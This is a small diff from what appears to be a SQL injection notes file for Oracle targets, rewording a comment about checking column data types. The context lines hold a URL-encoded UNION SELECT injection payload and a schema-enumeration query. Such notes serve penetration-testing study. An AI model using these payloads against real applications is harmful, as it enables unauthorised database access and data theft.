@@ -10,6 +10,6 @@ SELECT * FROM all_tab_columns WHERE table_name = 'Your Table_name'  <OR>  SELECT
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-#Check data types 
+#Check data types of colmuns used by the query
 
 '+UNION+SELECT+null,null+FROM+dual--
